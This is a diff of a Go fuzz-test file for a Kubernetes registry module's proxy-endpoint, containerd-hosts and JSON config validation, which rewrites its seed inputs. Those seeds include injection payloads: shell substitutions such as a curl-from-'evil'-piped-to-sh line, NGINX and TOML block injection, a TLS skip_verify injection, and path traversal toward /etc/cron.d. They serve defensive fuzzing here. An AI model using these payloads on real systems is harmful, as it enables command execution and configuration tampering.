@@ -65,53 +65,6 @@ const shellMetaCharacters = "$`\\"
 // nginxMetaCharacters terminate or open an NGINX directive or block.
 const nginxMetaCharacters = ";{}#'\" \t\r\n"
 
-// injectionSeeds are payloads targeting the two sinks described above.
-var injectionSeeds = []string{
-	"",
-	" ",
-	"\t",
-	"\n",
-	"\r\n",
-	"10.0.0.1:5001",
-	"10.0.0.1",
-	":5001",
-	"[fd00::1]:5001",
-	"registry.example.com:5001",
-	// NGINX directive / block injection.
-	"10.0.0.1:5001; return 200",
-	"10.0.0.1:5001;}\nserver { listen 127.0.0.1:5002; proxy_pass evil; }",
-	"10.0.0.1:5001 # comment",
-	"evil.example.com:5001",
-	// Shell injection through the unquoted heredoc.
-	"$(id > /tmp/pwned)",
-	"10.0.0.1:5001$(curl http://evil/x|sh)",
-	"`id`",
-	"${IFS}",
-	"\\",
-	"$discovered_node_ip",
-	// The bootstrap placeholder: the one value carrying a shell metacharacter
-	// that validation is expected to admit, plus the ways it could be abused.
-	helpers.NodeIPPlaceholder,
-	helpers.NodeIPPlaceholder + ":5001",
-	helpers.NodeIPPlaceholder + ":5001;}\nserver { listen 127.0.0.1:5002; }",
-	helpers.NodeIPPlaceholder + "$(id):5001",
-	helpers.NodeIPPlaceholder + helpers.NodeIPPlaceholder + ":5001",
-	"${discovered_node_ip:-$(id)}:5001",
-	"${discovered_node_ipX}:5001",
-	"${DISCOVERED_NODE_IP}:5001",
-	// Path traversal into the containerd registry.d layout.
-	"../../../etc/cron.d/x",
-	"a/../../b",
-	// Quoting edge cases.
-	`"`,
-	`\"`,
-	"'",
-	"10.0.0.1:99999",
-	"10.0.0.1:-1",
-	"10.0.0.1:abc",
-	"0:0",
-}
-
 // ---------------------------------------------------------------------------
 // Safety predicates.
 // ---------------------------------------------------------------------------
@@ -209,10 +162,29 @@ func validFuzzContext() Context {
 // ---------------------------------------------------------------------------
 
 func FuzzContextProxyEndpoints(f *testing.F) {
-	for _, seed := range injectionSeeds {
-		f.Add(seed, "10.0.0.2:5001")
-		f.Add("10.0.0.1:5001", seed)
-	}
+	// The pair the module generates, then one endpoint at a time replaced by a
+	// value aimed at a sink: an NGINX directive or block, a comment, a shell
+	// substitution, a line break, the bootstrap placeholder and its near misses.
+	f.Add("10.0.0.1:5001", "10.0.0.2:5001")
+	f.Add("[fd00::1]:5001", "[fd00::2]:5001")
+	f.Add("", "10.0.0.2:5001")
+	f.Add("10.0.0.1", "10.0.0.2:5001")
+	f.Add(":5001", "10.0.0.2:5001")
+	f.Add("10.0.0.1:5001; return 200", "10.0.0.2:5001")
+	f.Add("10.0.0.1:5001;}\nserver { listen 127.0.0.1:5002; }", "10.0.0.2:5001")
+	f.Add("10.0.0.1:5001 # comment", "10.0.0.2:5001")
+	f.Add("$(id > /tmp/pwned)", "10.0.0.2:5001")
+	f.Add("`id`", "10.0.0.2:5001")
+	f.Add("${IFS}", "10.0.0.2:5001")
+	f.Add("10.0.0.1:5001$(curl http://evil/x|sh)", "10.0.0.2:5001")
+	f.Add("\\", "10.0.0.2:5001")
+	f.Add(helpers.NodeIPPlaceholder+":5001", "10.0.0.2:5001")
+	f.Add(helpers.NodeIPPlaceholder, "10.0.0.2:5001")
+	f.Add("${discovered_node_ip:-$(id)}:5001", "10.0.0.2:5001")
+	f.Add("10.0.0.1:5001", "$(id)")
+	f.Add("10.0.0.1:5001", "10.0.0.2:99999")
+	f.Add("10.0.0.1:5001", "evil.example.com:5001")
+	f.Add("10.0.0.1:5001", "\x00")
 
 	f.Fuzz(func(t *testing.T, first, second string) {
 		ctx := validFuzzContext()
@@ -237,11 +209,30 @@ func FuzzContextProxyEndpoints(f *testing.F) {
 // ---------------------------------------------------------------------------
 
 func FuzzContextHosts(f *testing.F) {
-	for _, seed := range injectionSeeds {
-		f.Add(seed, "127.0.0.1:5001", "https")
-		f.Add("registry.d8-system.svc:5001", seed, "https")
-		f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", seed)
-	}
+	// The triple the module generates, then each of the three replaced in turn.
+	// The hosts key becomes a directory name under /etc/containerd/registry.d,
+	// the mirror host a table key in hosts.toml, and the scheme selects TLS
+	// handling -- so each has a different sink and its own payloads.
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "https")
+	f.Add("registry.example.com", "10.0.0.1:5001", "http")
+	f.Add("", "127.0.0.1:5001", "https")
+	f.Add("../../../etc/cron.d/x", "127.0.0.1:5001", "https")
+	f.Add("a/../../b", "127.0.0.1:5001", "https")
+	f.Add("$(id > /tmp/pwned)", "127.0.0.1:5001", "https")
+	f.Add("`id`", "127.0.0.1:5001", "https")
+	f.Add("registry.d8-system.svc:5001 # comment", "127.0.0.1:5001", "https")
+	f.Add("registry.d8-system.svc:99999", "127.0.0.1:5001", "https")
+	f.Add("\x00", "127.0.0.1:5001", "https")
+	f.Add("registry.d8-system.svc:5001", "", "https")
+	f.Add("registry.d8-system.svc:5001", "$(id)", "https")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001\"]\n[host.\"http://evil\"", "https")
+	f.Add("registry.d8-system.svc:5001", helpers.NodeIPPlaceholder+":5001", "https")
+	f.Add("registry.d8-system.svc:5001", helpers.NodeIPPlaceholder, "https")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "HTTPS")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "ftp")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "https\nskip_verify = true")
+	f.Add("registry.d8-system.svc:5001", "127.0.0.1:5001", "$(id)")
 
 	f.Fuzz(func(t *testing.T, hostName, mirrorHost, mirrorScheme string) {
 		ctx := validFuzzContext()
@@ -291,24 +282,31 @@ func FuzzContextHosts(f *testing.F) {
 // bashible context and flatten it for the template. None of it may panic, and a
 // config that validates must still validate after the conversion.
 func FuzzConfigJSONRoundTrip(f *testing.F) {
-	seeds := []string{
-		`{}`,
-		`null`,
-		`[]`,
-		`{"mode":"Proxy","version":"v1","imagesBase":"registry.d8-system.svc:5001/system/deckhouse",` +
-			`"proxyEndpoints":["10.0.0.1:5001"],"hosts":{"registry.d8-system.svc:5001":` +
-			`{"mirrors":[{"host":"127.0.0.1:5001","scheme":"https"}]}}}`,
-		`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https"},{"host":"h","scheme":"https"}]}}}`,
-		`{"proxyEndpoints":[""]}`,
-		`{"proxyEndpoints":["$(id)"]}`,
-		`{"hosts":{"":{"mirrors":[]}}}`,
-		`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https","rewrites":[{"from":"a","to":"b"}]}]}}}`,
-		`{"mode":123}`,
-		`{"proxyEndpoints":"not-a-list"}`,
-	}
-	for _, seed := range seeds {
-		f.Add([]byte(seed))
-	}
+	// The secret's payload as the module writes it, then documents that are not
+	// that: absent, the wrong JSON type, fields of the wrong type, duplicates,
+	// and values aimed at the sinks the model guards.
+	f.Add([]byte(`{"mode":"Proxy","version":"v1","imagesBase":"registry.d8-system.svc:5001/system/deckhouse",` +
+		`"proxyEndpoints":["10.0.0.1:5001"],"hosts":{"registry.d8-system.svc:5001":` +
+		`{"mirrors":[{"host":"127.0.0.1:5001","scheme":"https"}]}}}`))
+	f.Add([]byte(`{}`))
+	f.Add([]byte(`null`))
+	f.Add([]byte(`[]`))
+	f.Add([]byte(``))
+	f.Add([]byte(`{`))
+	f.Add([]byte(`{"mode":123}`))
+	f.Add([]byte(`{"mode":"Proxy"}`))
+	f.Add([]byte(`{"proxyEndpoints":"not-a-list"}`))
+	f.Add([]byte(`{"proxyEndpoints":[]}`))
+	f.Add([]byte(`{"proxyEndpoints":[""]}`))
+	f.Add([]byte(`{"proxyEndpoints":["$(id)"]}`))
+	f.Add([]byte(`{"proxyEndpoints":["10.0.0.1:5001","10.0.0.1:5001"]}`))
+	f.Add([]byte(`{"hosts":{}}`))
+	f.Add([]byte(`{"hosts":{"":{"mirrors":[]}}}`))
+	f.Add([]byte(`{"hosts":{"a":{"mirrors":[]}}}`))
+	f.Add([]byte(`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https"},{"host":"h","scheme":"https"}]}}}`))
+	f.Add([]byte(`{"hosts":{"a":{"mirrors":[{"host":"h","scheme":"https","rewrites":[{"from":"a","to":"b"}]}]}}}`))
+	f.Add([]byte(`{"hosts":{"../../etc":{"mirrors":[{"host":"h","scheme":"https"}]}}}`))
+	f.Add([]byte(`{"MODE":"Proxy","PROXYENDPOINTS":["10.0.0.1:5001"]}`))
 
 	f.Fuzz(func(t *testing.T, raw []byte) {
 		var config Config
